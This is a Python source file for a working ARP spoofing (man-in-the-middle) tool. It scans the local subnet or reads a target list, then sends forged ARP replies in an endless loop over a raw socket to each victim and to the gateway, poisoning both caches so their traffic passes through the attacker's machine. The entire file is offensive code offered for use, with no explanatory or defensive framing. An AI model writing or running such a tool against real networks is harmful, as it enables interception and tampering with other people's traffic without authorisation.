#!/usr/bin/python3

import re
import socket
import asyncio
import aioping
import binascii
import argparse
import netifaces


ARP_FILE = "/proc/net/arp"  # ARP table file
ARP_PACKET = b'\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02'  # ARP Packet
PROTOCOL_IPV4 = socket.htons(0x0800)  # Ethernet II Protocol

PING_TIMEOUT = 2  # Response timeout in ping (seconds)
REQUEST_DELAY_CLIENT = 0  # ARP request delay for client (seconds)
REQUEST_DELAY_GATEWAY = 0.3 # ARP request delay for gateway (seconds)


# Regular expression patterns
class Pattern:
	IPV4 = r'\d+\.\d+\.\d+\.\d+'
	MAC = r'(?:[0-9a-fA-F]:?){12}'


class ARP:
	Table = []

	def __packet_generate(sender_mac, target_mac, sender_ip, target_ip):
		sha = Network.encode_mac(sender_mac)
		tha = Network.encode_mac(target_mac)

		spa = socket.inet_aton(sender_ip)
		tpa = socket.inet_aton(target_ip)

		return tha + sha + ARP_PACKET + sha + spa + tha + tpa

	async def spoofing(connect, victim, gateway, interface_mac, delay):
		packet = ARP.__packet_generate(interface_mac, victim[1], gateway[0], victim[0])

		while True:
			connect.send(packet)

			print(f"ARP packet send to {victim[0]} ({victim[1]}), operation REPLY (0x0002)")
			await asyncio.sleep(delay)

	def get_connect(interface):
		connect = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, PROTOCOL_IPV4)
		connect.bind((interface, PROTOCOL_IPV4))

		return connect

	def get_table():
		with open(ARP_FILE) as arp:
			ARP.Table = []

			for line in arp.readlines():
				ip = re.search(r'\d+\.\d+\.\d+\.\d+', line)
				mac = re.search(r'(?:[0-9a-fA-F]:?){12}', line)

				if ip and mac and mac.group(0) != "00:00:00:00:00:00":
					ARP.Table.append((ip.group(0), mac.group(0)))

		return ARP.Table

	def get_mac(ipv4):
		for client in ARP.Table:
			if client[0] == ipv4:
				return client[1] 

		return False


class Network:
	def encode_mac(address):
		return binascii.unhexlify(address.strip().replace(':', ''))

	def get_interface_mac(interface):
		return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]

	def get_interface_ipv4(interface):
		return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["addr"]

	def get_interface_gateway(interface):
		gateways = netifaces.gateways()[netifaces.AF_INET]

		for gateway in gateways:
			if gateway[1] == interface:
				return gateway

		return None

	def get_interfaces():
		return netifaces.interfaces()

	def get_gateways():
		return netifaces.gateways()[netifaces.AF_INET]

	def get_default_gateway():
		return netifaces.gateways()["default"][netifaces.AF_INET]

	async def ping(host, timeout = 2, subnet = False):
		if subnet:
			mask = '.'.join(host.split('.')[:-1])
			tasks = [asyncio.create_task(Network.ping(f"{mask}.{net}")) for net in range(1, 255)]

			await asyncio.wait(tasks)

		else:
			try:
				await aioping.ping(host, timeout=timeout)

			except TimeoutError:
				pass


async def attack(victims, gateway, interface):
	connect = ARP.get_connect(interface)
	interface_mac = Network.get_interface_mac(interface)
	tasks = []

	for victim in victims:
		if victim != gateway:
			tasks.append(
				asyncio.create_task(ARP.spoofing(connect, victim, gateway, interface_mac, REQUEST_DELAY_CLIENT)))
			tasks.append(
				asyncio.create_task(ARP.spoofing(connect, gateway, victim, interface_mac, REQUEST_DELAY_GATEWAY)))

	await asyncio.wait(tasks)


async def local_scanner(gateway):
	result = []
	interface_ip = Network.get_interface_ipv4(gateway[1])

	await Network.ping(gateway[0], timeout=PING_TIMEOUT, subnet=True)
	ARP.get_table()

	for client in ARP.Table:
		if client not in [interface_ip, gateway[0]]:
			print(f" -- {client[0]} ({client[1]})")
			result.append(client)

	if result == []:
		print("No hosts found on your local network. Try again..")
		raise KeyboardInterrupt

	else:
		answer = input("\nContinue? [Y/n] ")

		if answer not in ['Y', 'y']:
			raise KeyboardInterrupt

	return result


async def main():
	victims = []
	args = parse_arguments()

	if args.ping:
		PING_TIMEOUT = args.ping

	if args.interface:
		gateway = Network.get_interface_gateway(args.interface)

		if gateway is None:
			print(f"Interface {args.interface} not enabled.")
			raise KeyboardInterrupt

	else:
		gateway = Network.get_default_gateway()
		print(f"Interface {gateway[1]} used.")

	if args.target:
		print("")

		with open(args.target) as file:
			ARP.get_table()

			for client in file.readlines():
				ipv4 = client.strip()

				await Network.ping(ipv4, timeout=5)
				mac = ARP.get_mac(ipv4)

				if mac:
					victims.append((ipv4, ARP.get_mac(ipv4)))
					print((ipv4, mac))

				else:
					print(f" -- {ipv4} (Invalid IPv4)")

		if len(victims) < 1:
			print("\nNo valid IPs were found in your file.")
			raise KeyboardInterrupt

	else:
		print("Scanning computers in local network..\n")
		victims = await local_scanner(gateway)

	gateway_mac = ARP.get_mac(gateway[0])
	await attack(victims, (gateway[0], gateway_mac), gateway[1])  # Victims List; Gateway (IP, MAC), Interface


def parse_arguments():
	parser = argparse.ArgumentParser()

	parser.add_argument('-i', '--interface', dest="interface", help="Set interface or use default")
	parser.add_argument('-t', '--target', dest="target", help="Target's list file")
	parser.add_argument('-p', '--ping-delay', dest="ping", help="Custom ping delay for scanning (default: 2s)")

	return parser.parse_args()


if __name__== "__main__":
	loop = asyncio.new_event_loop()
	asyncio.set_event_loop(loop)

	try:
		loop.run_until_complete(main())

	except KeyboardInterrupt:
		loop.close()
		print("Attack was stopped.")
